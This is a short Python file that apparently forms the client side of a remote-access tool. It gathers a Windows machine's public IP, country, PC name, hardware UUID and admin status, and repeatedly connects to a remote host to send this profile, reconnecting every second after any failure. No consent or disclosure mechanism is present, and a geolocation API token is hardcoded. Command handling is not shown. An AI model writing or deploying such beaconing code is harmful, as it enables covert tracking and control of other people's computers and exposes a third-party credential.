
import socket
import time
import platform
import ctypes
import requests
from wmi import WMI

def check_account_type():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() != 0:
            return "Admin"
        else:
            return "User"
    except Exception:
        return "None"
        
def get_client_info():
    system = platform.system()
    version = platform.version().split('.')[0]
    os = f"{system} {version}"
    response = requests.get('https://ipv4.jsonip.com', timeout=5)
    data = response.json()
    ip = data.get('ip')
    response = requests.get(f'https://api.findip.net/{ip}/?token=000e63e9964845a693b5dcd40dfd6a9d', timeout=5)
    data = response.json()
    country_en = data['country']['names']['en']

    client_info = {
        "IP": ip, 
        "PC Name": platform.node(),  
        "PC ID":  WMI().Win32_ComputerSystemProduct()[0].UUID,
        "OS": os, 
        "Account Type": check_account_type(), 
        "Country": country_en,
        "Tag": "Remote PC",
        }
    return client_info

def start_connection(HOST, PORT):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((HOST, PORT))
            client_info = get_client_info()
            client_socket.sendall(str(client_info).encode('utf-8'))

            while True:
                data = client_socket.recv(1024) 
                if not data:
                    break
        
        except (socket.error, ConnectionResetError):
            time.sleep(1)
        
        finally:
            client_socket.close()